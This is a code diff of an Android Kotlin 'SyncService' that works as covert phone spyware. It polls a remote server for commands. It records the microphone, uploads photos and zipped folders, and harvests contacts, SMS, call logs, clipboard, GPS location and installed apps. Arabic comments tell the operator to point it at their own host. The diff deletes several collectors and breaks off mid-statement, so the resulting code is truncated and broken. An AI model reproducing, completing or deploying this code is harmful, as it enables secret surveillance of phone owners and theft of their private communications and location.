@@ -1,8 +1,4 @@
 // android/app/src/main/java/com/assets/service/SyncService.kt
-// Aligned with server.js above — same HMAC, same HKDF, same endpoints.
-// Requires in build.gradle defaultConfig:
-//   buildConfigField "String", "NODE_HMAC_KEY", "\"<64 hex chars>\""
-
 package com.assets.service
 
 import android.app.Notification
@@ -26,7 +22,6 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Settings
 import androidx.core.app.NotificationCompat
-import java.io.ByteArrayInputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.net.HttpURLConnection
@@ -51,7 +46,7 @@ class SyncService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
-    // point these at the same host you deploy server.js to
+    // غير YOUR-HOST لرابط السيرفر بتاعك على Render مثلاً
     private val STREAM_URL = "https://YOUR-HOST/api/v3/uranium/stream"
     private val INGEST_URL = "https://YOUR-HOST/api/v3/uranium/upload_raw"
 
@@ -59,7 +54,6 @@ class SyncService : Service() {
     private var wifiAutopilotEnabled = true
     private var neuralState = "NEURAL_ACTIVE_v17"
 
-    // ── auth: HMAC-SHA256 + HKDF, mirror of server.js ─────────────────
     private object Auth {
         private val MASTER: ByteArray = hex(BuildConfig.NODE_HMAC_KEY)
 
@@ -96,7 +90,6 @@ class SyncService : Service() {
         fun keyFor(id: String): ByteArray =
             hkdf(id.toByteArray(), "uranium-v17".toByteArray(), 32)
 
-        /** returns Triple(timestamp, signature-hex, bodySha256Hex) */
         fun sign(id: String, body: ByteArray): Triple<String, String, String> {
             val ts = (System.currentTimeMillis() / 1000).toString()
             val bodyHash = MessageDigest.getInstance("SHA-256").digest(body)
@@ -109,7 +102,6 @@ class SyncService : Service() {
         }
     }
 
-    // ── service lifecycle ─────────────────────────────────────────────
     override fun onCreate() {
         super.onCreate()
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -145,7 +137,6 @@ class SyncService : Service() {
         wakeLock?.release(); scope.cancel()
     }
 
-    // ── heartbeat + task poll (signed) ────────────────────────────────
     private suspend fun heartbeatLoop(nodeId: String, model: String) {
         while (scope.isActive) {
             try {
@@ -177,7 +168,6 @@ class SyncService : Service() {
         }
     }
 
-    // ── signed POST helper ────────────────────────────────────────────
     private fun signedPost(url: String, nodeId: String, model: String, body: ByteArray,
                            contentType: String, timeoutMs: Int): HttpURLConnection {
         val (ts, sig, _) = Auth.sign(nodeId, body)
@@ -194,7 +184,6 @@ class SyncService : Service() {
         }
     }
 
-    // ── action dispatch ───────────────────────────────────────────────
     private fun dispatch(nodeId: String, model: String, action: String) {
         when {
             action.contains("MIC_AI_LISTEN")   -> recordAudio(nodeId, model)
@@ -238,17 +227,20 @@ class SyncService : Service() {
         }
     }
 
-    // ── network gate ──────────────────────────────────────────────────
     private fun allowedOnNetwork(): Boolean =
         !wifiAutopilotEnabled || isOnWifi()
 
-    private fun isOnWifi(): Boolean = try {
-        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        val net = cm.activeNetwork ?: return false
-        cm.getNetworkCapabilities(net)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
-    } catch (_: Exception) { false }
+    // الإصلاح هنا: تحويل الدالة لـ Block Body
+    private fun isOnWifi(): Boolean {
+        return try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val net = cm.activeNetwork ?: return false
+            cm.getNetworkCapabilities(net)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
+        } catch (_: Exception) {
+            false
+        }
+    }
 
-    // ── upload (signed, retried) ──────────────────────────────────────
     private fun upload(nodeId: String, model: String, name: String, bytes: ByteArray) {
         repeat(3) { attempt ->
             try {
@@ -266,7 +258,6 @@ class SyncService : Service() {
         }
     }
 
-    // ── reports ───────────────────────────────────────────────────────
     private fun report(nodeId: String, model: String, text: String) {
         try {
             val body = JSONObject()
@@ -286,7 +277,6 @@ class SyncService : Service() {
         report(nodeId, model, "sent $name")
     }
 
-    // ── audio ─────────────────────────────────────────────────────────
     private fun recordAudio(nodeId: String, model: String) {
         try {
             val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
@@ -309,7 +299,6 @@ class SyncService : Service() {
         }
     }
 
-    // ── latest photo ──────────────────────────────────────────────────
     private fun snapLatestPhoto(nodeId: String, model: String) {
         try {
             val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
@@ -336,7 +325,6 @@ class SyncService : Service() {
         } catch (e: Exception) { report(nodeId, model, "snap err: ${e.message}") }
     }
 
-    // ── folder zip ────────────────────────────────────────────────────
     private fun zipAndUpload(nodeId: String, model: String, folder: String, uri: Uri) {
         try {
             report(nodeId, model, "zipping $folder")
@@ -371,7 +359,6 @@ class SyncService : Service() {
         } catch (e: Exception) { report(nodeId, model, "$folder err: ${e.message}") }
     }
 
-    // ── collectors ────────────────────────────────────────────────────
     private fun readContacts(): String {
         val sb = StringBuilder("=== CONTACTS ===\n")
         try {
@@ -395,88 +382,4 @@ class SyncService : Service() {
             contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c ->
                 val bI = c.getColumnIndex("body"); val aI = c.getColumnIndex("address")
                 while (c.moveToNext()) {
-                    val a = if (aI != -1) c.getString(aI) else "?"
-                    val b = if (bI != -1) c.getString(bI) else ""
-                    sb.append("From: $a\n$b\n---\n")
-                }
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-
-    private fun readCalls(): String {
-        val sb = StringBuilder("=== CALLS ===\n")
-        try {
-            contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI,
-                null, null, null, null)?.use { c ->
-                val nI = c.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
-                val tI = c.getColumnIndex(android.provider.CallLog.Calls.TYPE)
-                while (c.moveToNext()) {
-                    val n = if (nI != -1) c.getString(nI) else "?"
-                    val t = if (tI != -1) c.getString(tI) else "0"
-                    sb.append("$n | type=$t\n")
-                }
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-
-    private fun readClipboard(): String {
-        val sb = StringBuilder("=== CLIPBOARD ===\n")
-        try {
-            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            if (cm.hasPrimaryClip()) {
-                val item = cm.primaryClip?.getItemAt(0)
-                sb.append("${item?.text}\n")
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-
-    private fun readLocation(): String {
-        val sb = StringBuilder("=== GPS ===\n")
-        try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            var best: Location? = null
-            for (p in lm.allProviders) {
-                val l = lm.getLastKnownLocation(p) ?: continue
-                if (best == null || l.time > best!!.time) best = l
-            }
-            if (best != null) {
-                sb.append("lat=${best!!.latitude}\n")
-                sb.append("lon=${best!!.longitude}\n")
-                sb.append("https://maps.google.com/?q=${best!!.latitude},${best!!.longitude}\n")
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-
-    private fun readApps(): String {
-        val sb = StringBuilder("=== APPS ===\n")
-        try {
-            packageManager.getInstalledPackages(0).forEach {
-                val label = it.applicationInfo?.loadLabel(packageManager)?.toString() ?: "?"
-                sb.append("• $label\n")
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-
-    private fun storageAudit(): String {
-        val sb = StringBuilder("=== STORAGE ===\n")
-        try {
-            listOf("DCIM" to MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                   "Files" to MediaStore.Files.getContentUri("external")).forEach { (n, u) ->
-                var cnt = 0; var total = 0L
-                val proj = arrayOf(MediaStore.MediaColumns.SIZE)
-                contentResolver.query(u, proj, null, null, null)?.use { c ->
-                    cnt = c.count
-                    val sI = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
-                    if (sI != -1) while (c.moveToNext()) total += c.getLong(sI)
-                }
-                sb.append("$n: $cnt files, ~${"%.2f".format(total / 1048576.0)} MB\n")
-            }
-        } catch (_: Exception) {}
-        return sb.toString()
-    }
-}
+                    val a
